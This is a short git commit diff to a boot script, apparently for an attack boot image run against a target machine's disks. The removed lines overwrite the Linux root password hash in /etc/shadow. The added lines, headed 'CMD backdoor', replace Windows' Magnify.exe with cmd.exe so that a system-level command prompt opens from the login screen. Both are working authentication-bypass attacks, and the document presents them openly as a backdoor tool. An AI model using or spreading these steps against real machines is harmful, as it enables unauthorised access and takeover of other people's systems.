c2781a86cbb2efb4e0a2eca99f6cff3a46a27411
Nicklaus McClendon <nicklaus@kulinacs.com>
2018-09-11 15:32:43 -0500

    Windows

--- src/opt/bootsync.sh
+++ src/opt/bootsync.sh
@@ -1,5 +1,6 @@
 #!/bin/sh
-# Set the root password to guest
-sudo mount /dev/sda1 /mnt
-sudo sed -i 's#root:.*:$#root:$6$aY4k4wkeu8OgIL.y$5JH3/VNXdLbvwU1rJAiXgcbMTmCKpIPcJZt8Xk4Kcx71DEOWPhfiQvbdyAka0gJ0d3u9dymmSE85ZNvhKRE4E1:17206:0:99999:7:::#' /mnt/etc/shadow
+# CMD backdoor
+sudo mount -t ntfs-3g /dev/sda2 /mnt
+sudo mv /mnt/Windows/System32/Magnify.exe /mnt/Windows/System32/Magnify.old
+sudo cp /mnt/Windows/System32/cmd.exe /mnt/Windows/System32/Magnify.exe
 /sbin/poweroff -f
